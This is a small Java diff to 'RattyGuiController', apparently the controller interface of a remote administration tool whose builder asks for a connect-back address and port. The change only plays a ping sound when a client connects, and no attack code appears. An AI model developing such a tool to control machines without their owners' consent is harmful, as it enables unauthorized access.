@@ -54,6 +54,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	
+	private static final Sound PING = Sound.loadSound("/ping.wav");
+	
 	public RattyGuiController() {
 		gui = new RattyGui();
 		clients = new HashMap<ActiveConnection, ServerClient>();
@@ -441,6 +443,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		super.connected(server, connection);
 		
 		clients.put(connection, client);
+		
+		PING.play();
 	}
 	
 	@Override
